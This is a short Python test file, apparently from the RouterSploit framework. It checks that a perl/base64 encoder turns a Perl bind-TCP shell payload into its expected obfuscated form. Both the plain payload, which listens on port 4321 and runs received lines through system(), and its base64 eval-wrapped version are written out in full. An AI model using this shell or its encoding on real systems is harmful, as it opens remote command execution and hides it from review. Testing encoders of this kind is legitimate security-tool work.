from routersploit.modules.encoders.perl.base64 import Encoder


# perl bind tcp payload with rport=4321
bind_tcp = (
    "use IO;foreach my $key(keys %ENV){" +
    "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort," +
    "4321" +
    ",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){" +
    "if($_=~ /(.*)/){system $1;}};"
)

# perl bind tcp payload with rport=4321 encoded with perl/base64
bind_tcp_encoded = (
    "use MIME::Base64;eval(decode_base64('dXNlIElPO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKExvY2FsUG9ydCw0MzIxLFJldXNlLDEsTGlzdGVuKS0+YWNjZXB0OyR+LT5mZG9wZW4oJGMsdyk7U1RESU4tPmZkb3BlbigkYyxyKTt3aGlsZSg8Pil7aWYoJF89fiAvKC4qKS8pe3N5c3RlbSAkMTt9fTs='));"
)


def test_payload_encoding():
    """ Test scenario - payload encoding """

    encoder = Encoder()
    assert encoder.encode(bind_tcp) == bind_tcp_encoded
